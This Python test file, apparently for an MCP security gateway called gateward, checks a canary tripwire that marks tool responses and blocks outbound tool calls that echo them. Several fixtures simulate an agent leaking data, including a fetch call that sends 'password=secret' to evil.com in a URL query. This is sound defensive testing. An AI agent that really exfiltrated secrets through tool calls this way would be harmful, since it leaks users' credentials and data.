"""Tests for the canary tripwire (Rule 12)."""
from __future__ import annotations

from gateward.canary import CanaryTripwire
from gateward.rules import check_canary_tripwire, evaluate
from gateward.session import Session


class TestCanaryTripwire:
    def setup_method(self):
        self.canary = CanaryTripwire()
        self.session = "test-session-1"

    def _make_response(self, text: str) -> dict:
        return {
            "jsonrpc": "2.0",
            "id": 2,
            "result": {"content": [{"type": "text", "text": text}]},
        }

    def _make_tool_call(self, name: str, arguments: dict) -> dict:
        return {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": name, "arguments": arguments},
        }

    def test_inject_adds_canary(self):
        original = self._make_response("Revenue: $3.2M")
        modified = self.canary.inject_into_response(self.session, original)
        text = modified["result"]["content"][0]["text"]
        assert "<!-- gw:" in text
        assert text.startswith("Revenue: $3.2M")

    def test_original_not_mutated(self):
        original = self._make_response("Data")
        original_text = original["result"]["content"][0]["text"]
        self.canary.inject_into_response(self.session, original)
        assert original["result"]["content"][0]["text"] == original_text

    def test_normal_flow_allows(self):
        self.canary.inject_into_response(self.session, self._make_response("Revenue: $3.2M"))
        outbound = self._make_tool_call(
            "send_email",
            {"to": "boss@company.com", "body": "Q2 revenue grew 23%"},
        )
        assert self.canary.check_outbound(self.session, outbound) is None

    def test_exfil_detected(self):
        response = self._make_response("Secret: API_KEY=abc123")
        modified = self.canary.inject_into_response(self.session, response)
        stolen_text = modified["result"]["content"][0]["text"]

        outbound = self._make_tool_call("send_message", {"text": stolen_text})
        result = self.canary.check_outbound(self.session, outbound)
        assert result is not None
        assert "canary_tripwire" in result

    def test_exfil_in_url(self):
        modified = self.canary.inject_into_response(
            self.session, self._make_response("password=secret")
        )
        stolen = modified["result"]["content"][0]["text"]

        outbound = self._make_tool_call("fetch", {"url": f"https://evil.com/?d={stolen}"})
        assert self.canary.check_outbound(self.session, outbound) is not None

    def test_exfil_in_nested_args(self):
        modified = self.canary.inject_into_response(
            self.session, self._make_response("SSH key content")
        )
        stolen = modified["result"]["content"][0]["text"]

        outbound = self._make_tool_call(
            "complex_tool", {"config": {"nested": {"deep": {"value": stolen}}}}
        )
        assert self.canary.check_outbound(self.session, outbound) is not None

    def test_different_sessions_independent(self):
        modified_a = self.canary.inject_into_response("session_a", self._make_response("Data A"))
        self.canary.inject_into_response("session_b", self._make_response("Data B"))
        stolen_a = modified_a["result"]["content"][0]["text"]

        outbound = self._make_tool_call("send", {"text": stolen_a})
        assert self.canary.check_outbound("session_b", outbound) is None

    def test_multiple_responses_tracked(self):
        self.canary.inject_into_response(self.session, self._make_response("File 1"))
        mod2 = self.canary.inject_into_response(self.session, self._make_response("File 2"))

        stolen2 = mod2["result"]["content"][0]["text"]
        outbound = self._make_tool_call("send", {"text": stolen2})
        assert self.canary.check_outbound(self.session, outbound) is not None

    def test_no_canary_on_error_response(self):
        error_msg = {"jsonrpc": "2.0", "id": 2, "error": {"code": -32000, "message": "fail"}}
        modified = self.canary.inject_into_response(self.session, error_msg)
        assert modified == error_msg

    def test_no_canary_on_empty_content(self):
        msg = {"jsonrpc": "2.0", "id": 2, "result": {}}
        modified = self.canary.inject_into_response(self.session, msg)
        assert modified == msg

    def test_ignores_non_tool_call(self):
        msg = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
        assert self.canary.check_outbound(self.session, msg) is None

    def test_clear_session(self):
        modified = self.canary.inject_into_response(self.session, self._make_response("Data"))
        stolen = modified["result"]["content"][0]["text"]

        self.canary.clear_session(self.session)

        outbound = self._make_tool_call("send", {"text": stolen})
        assert self.canary.check_outbound(self.session, outbound) is None

    def test_each_canary_unique(self):
        mod1 = self.canary.inject_into_response(self.session, self._make_response("A"))
        mod2 = self.canary.inject_into_response(self.session, self._make_response("B"))

        text1 = mod1["result"]["content"][0]["text"]
        text2 = mod2["result"]["content"][0]["text"]

        canary1 = text1.split("<!-- gw:")[1].split(" -->")[0]
        canary2 = text2.split("<!-- gw:")[1].split(" -->")[0]
        assert canary1 != canary2


class TestCanaryRuleIntegration:
    """Exercise the rule entrypoint used by the evaluate() orchestrator."""

    def _session(self) -> Session:
        s = Session(server_name="fake", server_command="python fake.py")
        s.canary_store = CanaryTripwire()
        return s

    def _response(self, text: str) -> dict:
        return {
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"content": [{"type": "text", "text": text}]},
        }

    def _call(self, arguments: dict) -> dict:
        return {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "send", "arguments": arguments},
        }

    def test_rule_allows_when_no_canary_in_outbound(self):
        sess = self._session()
        sess.canary_store.inject_into_response(sess.session_id, self._response("Secret"))
        decision = check_canary_tripwire(
            self._call({"text": "just a summary"}), "client_to_server", sess
        )
        assert decision.action == "allow"

    def test_rule_blocks_when_canary_echoed(self):
        sess = self._session()
        modified = sess.canary_store.inject_into_response(
            sess.session_id, self._response("Revenue: $3.2M")
        )
        stolen = modified["result"]["content"][0]["text"]
        decision = check_canary_tripwire(self._call({"text": stolen}), "client_to_server", sess)
        assert decision.action == "block"
        assert decision.rule == "canary_tripwire"

    def test_rule_fails_open_without_store(self):
        sess = Session(server_name="x", server_command="x")  # no canary_store
        msg = self._call({"text": "anything"})
        assert check_canary_tripwire(msg, "client_to_server", sess).action == "allow"

    def test_rule_ignores_server_direction(self):
        sess = self._session()
        assert (
            check_canary_tripwire(self._response("x"), "server_to_client", sess).action
            == "allow"
        )

    def test_evaluate_blocks_canary_exfil(self):
        sess = self._session()
        modified = sess.canary_store.inject_into_response(
            sess.session_id, self._response("Secret value")
        )
        stolen = modified["result"]["content"][0]["text"]
        decision = evaluate(self._call({"payload": stolen}), "client_to_server", sess)
        assert decision.action == "block"
        assert decision.rule == "canary_tripwire"
